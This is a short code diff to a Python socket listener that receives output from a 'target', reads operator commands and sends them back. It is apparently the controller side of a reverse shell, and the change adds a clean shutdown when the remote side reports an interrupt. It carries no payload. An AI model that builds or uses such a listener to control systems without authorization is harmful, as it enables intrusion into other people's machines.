@@ -12,9 +12,13 @@ def listen(ip,port):
     print("Listening on port " + str(port))
     conn, addr = s.accept()
     print('Connection received from ',addr)
-    while True:
+    running = True
+    while running:
         #Receive data from the target and get user input
         ans = conn.recv(1024).decode()
+        if (ans.__contains__("KeyboardInterrupt")):
+            s.close()
+            running = False
         sys.stdout.write(ans)
         command = input()
 
